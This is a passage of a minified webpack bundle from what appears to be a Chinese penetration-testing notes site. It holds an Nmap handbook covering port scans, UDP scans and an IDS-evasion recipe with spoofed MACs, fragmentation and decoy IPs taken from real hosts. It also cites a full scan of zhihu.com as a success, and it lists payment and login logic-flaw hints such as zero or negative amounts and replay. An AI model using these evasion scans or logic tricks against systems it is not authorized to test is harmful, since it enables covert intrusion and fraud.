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"},kfBs:function(nu,U,f){nu.exports={"ant-pro-menu-item-title":"ant-pro-menu-item-title___mwQLa","ant-menu-item":"ant-menu-item___o39QO","ant-menu-submenu-title":"ant-menu-submenu-title___2xzrJ",cascader:"cascader___YCSAg",cascaderDropdown_wra:"cascaderDropdown_wra___3BFU3",xssTree:"xssTree___3Nyqx"}},nMEn:function(nu,U,f){"use strict";f.r(U),f.d(U,"Nmap_\u624B\u518C",function(){return t});var R=f("q1tI"),h=f.n(R),l=f("/qoP"),j=f("ysNt"),n=j.e.singleATag_blank,u={name:"\u3010Nmap\u3011_\u624B\u518C",desc:h.a.createElement(h.a.Fragment,null,"Nmap\u626B\u63CF\u5DE5\u5177\uFF0C\u6700\u91CD\u8981\u7684\u626B\u63CF\u5DE5\u5177\u4E4B\u4E00"),steps:[{name:"\u601D\u8DEF",content:h.a.createElement(h.a.Fragment,null,l.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E("	\uFF08\u679A\u4E3E\u4E3B\u673A\uFF0C\u6307\u6309\u7167\u3010\u5DF2\u6709\u89C4\u5219\u3011\uFF0C\u53BB\u3010\u7A77\u5C3D\u679A\u4E3E\u3011\u7684\u5339\u914D\u3002\uFF09"," "))},{name:"\u5E38\u89C4\u626B\u63CF",steps:[{name:"TCP",desc:h.a.createElement(h.a.Fragment,null),content:h.a.createElement(h.a.Fragment,null,l.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


          \u521D\u671F\u7B80\u5355(\u6253\u70B9)\u63A2\u6D4B\uFF1A
              \u624B\u52A8\u65B9\u5F0F\uFF1A
                  \u521D\u7B5B
                      nmap  -p-  --max-rate  10000  <IP\u5730\u5740>
                          \u597D\u5904\u662F\uFF0C\u901F\u5EA6\u975E\u5E38\u5FEB\uFF0C\u53EF\u4EE5\u907F\u514D\u3010\u91CD\u8981\u7AEF\u53E3\u4E22\u5931\u3011

                      \u3010\u6587\u4EF6\u8BFB\u53D6\u3011\u589E\u5F3A\u7248\uFF1A
                          nmap  -p-  --max-rate  10000   -vv  -iL  <\u5B58\u653E\u4E00\u7EC4IP\u7684\u6587\u4EF6>  -oA  <\u8F93\u51FA\u62A5\u544A\u540D>
                              \u8FD9\u79CD\u65B9\u5F0F\uFF0C\u53EF\u4EE5\u3010\u521D\u7B5B\u3011\u4E00\u6279\u3002

                  \u7CBE\u7EC6\u626B\u63CF
                      nmap  -A  -sV  -sC  -Pn  -p  <\u7AEF\u53E3\u53F7\u591A\u4E2A\u7528\u9017\u53F7\u5206\u9694>  <IP\u5730\u5740>

              \u81EA\u52A8\u65B9\u5F0F
                  \u4E00\uFF1A
                      ports=$(nmap -p- --min-rate=1000 -T4 <IP\u5730\u5740> | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//)
                          \u901A\u8FC7\u521D\u6B65\u626B\u63CF\uFF0C\u5F97\u5230\u3010\u5168\u90E8\u7AEF\u53E3\u3011
                      nmap  -sC  -sV  -p$ports  <IP\u5730\u5740>  --open
                          \u3010--open\u3011\uFF0C\u53EA\u663E\u793A \u3010\u5F00\u653E\u7AEF\u53E3\u3011 \u90E8\u5206

                  \u4E8C\uFF1A
                      masscan -p1-65535 10.10.10.95 --rate=1000 -e tun0 > ports

                      ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\\n' ',' | sed 's/,$//')

                      nmap -Pn -sV -sC -p$ports 10.10.10.95



          nmap  -A  -sV  -sC  -Pn  <IP\u5730\u5740>
              1. \u4E00\u822C\u6765\u8BF4\uFF0C\u6700\u5E38\u7528\u7684\u4E00\u79CD\u65B9\u6848

          nmap  -A  -sV  -sC  -Pn  -vv  <IP\u5730\u5740>
              1. \u5E26\u7740\u66F4\u591A\u7684\u65E5\u5FD7


          nmap  -A  IP\u5730\u5740
              1.\u975E\u79D8\u5BC6\u68C0\u6D4B
              2.\u9ED8\u8BA4\u4F7F\u7528\u3010TCP\u3011\u68C0\u6D4B
              3.\u3010-A\u3011 \u542F\u7528 OS Detect\u3001Version Detect\u3001Script Scanning\u3001TraceRoute

          nmap -sV -sC -p- -Pn <IP\u5730\u5740> --min-rate=<\u63A2\u6D4B\u9891\u7387>
              1.\u4E5F\u662F\u4E00\u79CD\u8F83\u5E38\u7528\u7684\u65B9\u6848

          `,`
          \u626B\u63CFC\u6BB5\uFF1A
              nmap -A xxx.xxx.xxx.xxx/24
            `))},{name:"UDP",desc:h.a.createElement(h.a.Fragment,null,"\u7279\u70B9\uFF1A\u6781\u6162"),content:h.a.createElement(h.a.Fragment,null,l.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u3010UDP\u3011
              \u9700\u8981\u3010sudo\u3011\u6743\u9650

              nmap  -sU  <IP\u5730\u5740>
                  1.\u4F7F\u7528\u3010UDP\u3011\u68C0\u6D4B\u3002
                      1.\u6709\u65F6\uFF0C\u548C\u3010TCP\u3011\u622A\u7136\u4E0D\u540C\u3002

              nmap  -sC  -sU  <IP\u5730\u5740>
                  1.\u4F7F\u7528\u3010UDP\u3011\u68C0\u6D4B\u3002
                      1.\u6709\u65F6\uFF0C\u548C\u3010TCP\u3011\u622A\u7136\u4E0D\u540C\u3002

              `))}]},{name:"\u3010\u79D8\u5BC6\u626B\u63CF\u3011",content:h.a.createElement(h.a.Fragment,null,l.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E("	nmap -sS -A IP\u5730\u5740","		\u79D8\u5BC6\u68C0\u6D4B","		\u3010-sS\u3011 \u4F7F\u7528\u3010TCP/SYN\u3011\uFF0C\u75D5\u8FF9\u66F4\u52A0\u4E0D\u660E\u663E","	\u6700\u5C0F\u5316\u88AB\u68C0\u6D4B\u5230\u7684\u79D8\u5BC6\u626B\u63CF\uFF1A","		nmap --spoof-mac Cisco --data-length 24 -T paranoid --max-hostgroup 1 --max-parallelism 10 -Pn -f -D <\u8BF1\u9975\u626B\u63CFIP\u5730\u5740>,<RND:5>,ME -v -n -sS -sV -oA <\u7ED3\u679C\u8F93\u51FA\u5730\u5740> -p T:<\u5F00\u59CB\u7AEF\u53E3-\u7ED3\u675F\u7AEF\u53E3> --randomize-hosts <\u82E5\u5E72\u4E2A\u626B\u63CFIP\u5730\u5740>","			--spoof-mac Cisco \u4F2A\u9020MAC\u5730\u5740\uFF0C\u4EE5\u5339\u914D\u601D\u79D1\u7684\u4EA7\u54C1  \uFF080\u5219\u662F\u968F\u673A\uFF09","			--data-length 24 \u5411\u5927\u591A\u6570\u6B63\u5728\u53D1\u9001\u7684\u5305\uFF0C\u9644\u52A024\u5B57\u8282\u3010\u968F\u673A\u6570\u636E\u3011  \uFF08\u4EE5\u9632\u6B62\u90FD\u662F\u540C\u6837\u6570\u636E\uFF0C\u88AB\u8BC6\u522B\uFF09","			-T paranoid \u5C06\u65F6\u95F4\u8BBE\u7F6E\u5230 \u6700\u6162","			--max-hostgroup 1 \u9650\u5236\u4E00\u6B21\u626B\u63CF\u7684\u6700\u5927\u4E3B\u673A\u6570","			--max-parallelism 10 \u9650\u5236\u53D1\u9001\u3010\u6709\u6548\u63A2\u9488\u3011\u7684\u6570\u91CF  \uFF08\u4E0E--scan-delay\u4E0D\u517C\u5BB9\uFF09","			-Pn \u4E0D\u7528ping\u6765\u786E\u5B9A\u6D3B\u52A8\u7CFB\u7EDF  \uFF08ping\u53EF\u80FD\u4F1A\u6CC4\u9732\u6570\u636E\uFF09","			-f \u5206\u9694\u6570\u636E\u5305  \uFF08\u7528\u6765\u6B3A\u9A97 \u4F4E\u7AEF\u548C\u914D\u7F6E\u4E0D\u6B63\u786E \u7684ID\uFF09",h.a.createElement("div",{style:{marginLeft:"6.5em"}},"-D 10.1.20.5,RND,ME \u521B\u5EFA\u3010\u8BF1\u9975\u626B\u63CF\u3011\uFF0C\u4E0E\u653B\u51FB\u8005\u7684\u3010\u771F\u6B63\u626B\u63CF\u3011\u540C\u65F6\u8FD0\u884C\uFF0C\u53EF\u4EE5\u9690\u85CF\u5B9E\u9645\u653B\u51FB",h.a.createElement("ol",{style:{}},h.a.createElement("li",null,"\u539F\u7406\uFF1A\u6211\u770B\u522B\u4EBA\u6709\u65F6\u5728\u7528\uFF0C\u4F46\u539F\u7406\u770B\u4F3C\u5F88\u7384\u4E4E\uFF1B\u7ECF\u8FC7\u4E2A\u4EBA\u5206\u6790\u540E\uFF0C\u8BA4\u4E3A\u662F\u3010\u4F4E\u7EA7\u9A97\u672F\u3011\u3001\u4F46\u5BF9\u3010\u4F4E\u7EA7\u534F\u8BAE\u3011\u6709\u6548\u3002\uFF08\u670D\u52A1\u5668\u7ADF\u7136\u4F1A\u76F8\u4FE1\u4F60\uFF09"),h.a.createElement("li",null,"\u4F2A\u9020\u7684IP\uFF1A\uFF08\u4E24\u79CD\u65B9\u5F0F\uFF0C\u53EF\u4EE5\u6DF7\u5408\u4F7F\u7528\uFF09",h.a.createElement("ol",null,h.a.createElement("li",null,"\u65B9\u5F0F\u4E00\uFF1A\u624B\u52A8\u6307\u5B9A\u3010\u7279\u5B9AIP\u3011\uFF0C\u4EC0\u4E48\u90FD\u53EF\u4EE5",h.a.createElement("ol",null,h.a.createElement("li",null,"\u6BD4\u5982\uFF0C\u6211\u4EEC\u501F\u7528\u3010fofa\u3011\u5BF9\u3010securitytrails.com\u3011\u7684\u641C\u7D22\u7ED3\u679C\uFF1A\u3010-D 18.204.63.62,172.245.134.240,151.101.194.132,151.101.2.132\u3011"))),h.a.createElement("li",null,"\u65B9\u5F0F\u4E8C\uFF1A\u968F\u673A\u751F\u6210\uFF1A\u3010-D RND ","<\u4F2A\u9020\u6E90\u5730\u5740\u6570\u91CF>","\u3011"))))),"			-n \u4E0D\u4F7F\u7528DNS\u89E3\u6790 \uFF08\u56E0\u4E3A\u5185\u90E8\u6216\u5916\u90E8DNS\u670D\u52A1\u5668\uFF0C\u7ECF\u5E38\u4F1A\u8BB0\u5F55nmap\u63D0\u4EA4\u7684DNS\u4FE1\u606F\u67E5\u8BE2\uFF1B\u6240\u4EE5\uFF0C\u6211\u4EEC\u5E94\u8BE5\u7981\u7528DNS\u4FE1\u606F\u67E5\u8BE2\uFF09","			-sS \u8FDB\u884C\u79D8\u5BC6\u7684\u3010TCP SYN\u3011\u626B\u63CF  \uFF08\u8FD9\u5C06\u4E0D\u9700\u8981\u5B8C\u6574\u7684\u3010TCP\u63E1\u624B\u3011\uFF0C\u5C3D\u91CF\u907F\u514D\u89E6\u53D1\u3010\u8BBE\u5907\u68C0\u6D4B\u3011\uFF09","			-sV \u901A\u8FC7\u5F00\u542F\u7684\u7AEF\u53E3\uFF0C\u6765\u63A8\u6D4B\u670D\u52A1\u6216\u7248\u672C","			\u3010-oA\u3011 /desktop/pentest/nmap \u5C06\u7ED3\u679C\u8F93\u51FA  \uFF08\u53EF\u4EE5\u6307\u5B9A\u5404\u79CD\u683C\u5F0F\uFF09","			-p T:1-1024 \u6307\u5B9A\u8981\u626B\u63CF\u7684TCP\u7AEF\u53E3  \uFF08\u4E5F\u53EF\u4EE5\u662F\u8303\u56F4\uFF09","			--randomize-hosts \u968F\u673A\u5316\u76EE\u6807\u4E3B\u673A\u7684\u626B\u63CF\u6B21\u5E8F"," "))},{name:"\u811A\u672C\u4F7F\u7528",content:h.a.createElement(h.a.Fragment,null,l.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(h.a.createElement(h.a.Fragment,null,"	","\u5E38\u89C1\u6307\u4EE4\uFF1A \uFF08",n("\u8D44\u65991","https://zhuanlan.zhihu.com/p/26618074"),"\uFF09"),"		1.\u3010--script-updatedb\u3011\uFF0C\u5347\u7EA7\u6240\u6709\u811A\u672C"," ","		2.\u3010--script=\u811A\u672C\u540D\u79F0\u3011\uFF0C\u4F7F\u7528\u67D0\u4E2A\u811A\u672C","		3.\u3010--script-help=\u811A\u672C\u540D\u79F0\u3011\uFF0C\u67E5\u770B\u67D0\u4E2A\u811A\u672C\u7684\u5E2E\u52A9\u4FE1\u606F"," ","		3.\u3010--script-args=key1=value1,key2=value2...\u3011\uFF0C\u4F20\u9012\u591A\u4E2A\u53C2\u6570","		4.\u3010\u2013-script-args-file=\u6587\u4EF6\u540D\u3011\uFF0C\u4F7F\u7528\u6587\u4EF6 \u6765\u4F20\u9012\u53C2\u6570"," ","		5.\u3010--script-trace\u3011\uFF0C\u6253\u5370\u6536\u53D1\u8BF7\u6C42\u7684\u901A\u4FE1\u4FE1\u606F\u3002","	\u9488\u5BF9\u76EE\u6807\u4E3B\u673A \u6267\u884C\u6240\u6709\u7684\u811A\u672C\uFF1A","		nmap -T4 -A -sV -v3 -d -oA <\u8F93\u51FA\u6587\u4EF6\u65E0\u540E\u7F00\u540D\uFF0C\u652F\u6301\u76F8\u5BF9\u8DEF\u5F84> <IP\u5730\u5740>  --script all --script-args=vulns.showall <IP\u5730\u5740> ","			\u3010--script-args=\u3011\u4F20\u9012\u53C2\u6570 \uFF08\u539F\u4E66\u4E0A\u63CF\u8FF0\u6709\u9519\u8BEF\uFF0C\u81EA\u5DF1\u624B\u52A8\u6539\u6B63\uFF09","			\u3010--script\u3011\u597D\u50CF\u6CA1\u6709\u63D0\u5230\u662F\u5E72\u4EC0\u4E48\u7684\uFF1F","		\u6210\u529F\u4F8B\u5B50\uFF1A","			\u626B\u63CF\u3010zhihu.com\u3011\uFF0C\u603B\u8017\u65F68062.88\u79D2\u5DE6\u53F3\u3002","	Lua\u811A\u672C\uFF0C\u4E66\u5199NSE\uFF1A","		\u4FDD\u5B58\u5230 /usr/share/nmap/scripts \u76EE\u5F55 \uFF08\u6240\u6709NSE\u811A\u672C\u90FD\u5728\u8FD9\u91CC\uFF09"," "))},{name:"\u5176\u5B83\u5E38\u89C1\u9009\u9879",content:h.a.createElement(h.a.Fragment,null,l.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u3010-p<\u5F00\u59CB\u7AEF\u53E3>-<\u7ED3\u675F\u7AEF\u53E3>\u3011
              \u6307\u5B9A\u7AEF\u53E3\u8303\u56F4

              \u3010-p-\u3011
                  \u5168\u7AEF\u53E3\uFF0C\u6307\uFF1A\u7AEF\u53E3\u4ECE 1 \u5230 65535

          \u3010-v\u3011\uFF0C\u6253\u5370verbose\u7EA7\u522B\u65E5\u5FD7
              \u3010-vv\u3011\uFF0C\u6253\u5370 \u6BD4verbose \u66F4 verbose\u7684\u65E5\u5FD7

          \u3010-iL\u3011
              \uFF08InputList\uFF09
              \u4ECE\u6587\u4EF6\u4E2D\uFF0C\u8BFB\u53D6\u3010\u8D44\u4EA7\u5217\u8868\u3011

          \u3010-sU\u3011\uFF0CUDP\u626B\u63CF

          \u3010-sT\u3011\uFF0CTCP\u626B\u63CF\uFF08\u867D\u7136\u9ED8\u8BA4\u5C31\u662F\uFF09

          \u3010-sS\u3011
              \u4F7F\u7528\u3010TCP/SYN\u3011\uFF0C\u75D5\u8FF9\u66F4\u52A0\u4E0D\u660E\u663E
              \u6548\u679C\u662F\uFF1A\u66F4\u52A0\u79D8\u5BC6\u7684\u626B\u63CF\uFF0C\u66F4\u52A0\u9690\u79D8


          \u3010-sC\u3011\uFF0C\u2013script=default
              \u9ED8\u8BA4\u811A\u672C\u626B\u63CF \uFF08\u9ED8\u8BA4\u811A\u672C\u96C6\uFF09

          \u3010--script  <\u6307\u5B9A\u811A\u672C\u540D>\u3011
              \u53EF\u4EE5\u6307\u5B9A\uFF0C\u7528\u3010\u6307\u5B9A\u811A\u672C\u540D\u3011\u8FDB\u884C\u626B\u63CF
              \u5E38\u7528\u811A\u672C\uFF1A
                  \u3010vuln\u3011
                  \u652F\u6301\u901A\u914D\u7B26\uFF1A
                      \u5F62\u5982\u3010smb-vuln-*\u3011

          \u3010-sn\u3011\uFF0C\u4E0D\u8FDB\u884C\u7AEF\u53E3\u626B\u63CF
              \u6709\u4E9B\u60C5\u51B5\u4E0B\uFF0C\u7C7B\u4F3C\u4E8E\u3010ping\u626B\u63CF\u3011\u7684\u6548\u679C\u3002
              \u539F\u7406\uFF1A
                  \u5C06\u6240\u6709\u4E3B\u673A\u89C6\u4E3A\u3010\u5728\u7EBF\u3011\u3002\u8DF3\u8FC7\u4E86 \u4E3B\u673A\u53D1\u73B0 \u7684\u73AF\u8282\u3002


          \u3010--min-rate <\u5177\u4F53\u503C>\u3011
              \u624B\u52A8\u6307\u5B9A\u3010\u626B\u63CF\u9891\u7387\u3011
                  \u5BF9\u4E8E\u3010\u65E0\u9632\u706B\u5899 \u65E0WAF\u3011\u4EA7\u54C1\uFF0C\u5982\u9776\u673A\uFF0C\u53EF\u4EE5\u975E\u5E38\u5FEB

                  \u4F46\u5176\u5B83\u65F6\u5019\uFF0C\u5F88\u53D7\u5C40\u9650

          \u3010-oA <\u8F93\u51FA\u6587\u4EF6\u540D>\u3011\uFF0C\u7B49\u4E8E output all
              \u5BFC\u51FA\u6240\u67093\u79CD\u683C\u5F0F\u7684\u7ED3\u679C\u62A5\u544A


          \u3010-p  <\u6307\u5B9A\u7AEF\u53E3\u591A\u4E2A\u7528\u9017\u53F7\u5206\u9694>\u3011
              \u624B\u52A8\u6307\u5B9A\uFF0C\u626B\u63CF\u54EA\u4E9B\u7AEF\u53E3\u3002\uFF08\u5E38\u7528\u5728\u521D\u7B5B\u4E4B\u540E\u7684\u7CBE\u7EC6\u626B\u63CF\uFF09

          \u3010\u2013min-hostgroup\u3011
              \u7528\u4E8E\u6307\u5B9A Nmap \u5E94\u8BE5\u5E76\u884C\u626B\u63CF\u7684\u300A\u76EE\u6807\u300B\u7684\u6700\u5C0F\u6570\u91CF\u3002

          `))}]},t=u},q4c3:function(nu,U,f){"use strict";f.d(U,"a",function(){return n});var R=f("q1tI"),h=f.n(R),l=f("ysNt"),j=[{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"\u767B\u5F55\u3001\u6CE8\u518C",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:l.e.get_regex_fromArrKeywords(["\u767B\u5F55","\u767B\u9646","\u6CE8\u518C"]),desc:"\u767B\u5F55\u903B\u8F91",koans_\u63D0\u793A:["\u5E38\u89C1\uFF1A\u9A8C\u8BC1\u7801","\u5E38\u89C1\uFF1A\u4EFB\u610F\u6CE8\u518C","\u5E38\u89C1\uFF1A\u4EFB\u610F\u627E\u56DE","\u5E38\u89C1\uFF1A\u4EFB\u610F\u91CD\u7F6E","\u5E38\u89C1\uFF1A\u91CD\u5B9A\u5411","\u5E38\u89C1\uFF1A\u6B65\u9AA4\u8DF3\u8FC7","\u5E38\u89C1\uFF1A","\u5E38\u89C1\uFF1A\u2026\u2026\u2026\u2026"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"\u652F\u4ED8",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:l.e.get_regex_fromArrKeywords(["\u652F\u4ED8"]),desc:"\u652F\u4ED8\u903B\u8F91",koans_\u63D0\u793A:["\u5E38\u89C1\uFF1A0\u5143","\u5E38\u89C1\uFF1A\u8D1F\u6570","\u5E38\u89C1\uFF1A\u91CD\u653E","\u5E38\u89C1\uFF1A\u968F\u673A\u591A\u6B21\u63620.01\u5143","\u5E38\u89C1\uFF1A\u2026\u2026\u2026\u2026"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"\u91CD\u5B9A\u5411",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:l.e.get_regex_fromArrKeywords(["\u91CD\u5B9A\u5411","redirect","return","url"]),desc:"\u91CD\u5B9A\u5411\u903B\u8F91",koans_\u63D0\u793A:["\u5E38\u89C1\uFF1A\u6267\u884Cjs\u4EE3\u7801","\u5E38\u89C1\uFF1A\u8DF3\u8F6C\u5176\u5B83\u7F51\u7AD9","\u5E38\u89C1\uFF1A\u2026\u2026\u2026\u2026"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"\u63D0\u4EA4\u5404\u79CD\u4FE1\u606F",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:l.e.get_regex_fromArrKeywords(["\u8BC4\u8BBA","\u7559\u8A00","\u56DE\u590D","\u5E16","\u8868\u5355","\u63D0\u4EA4","\u7533\u8BF7","\u8D44\u6599","\u4FE1\u606F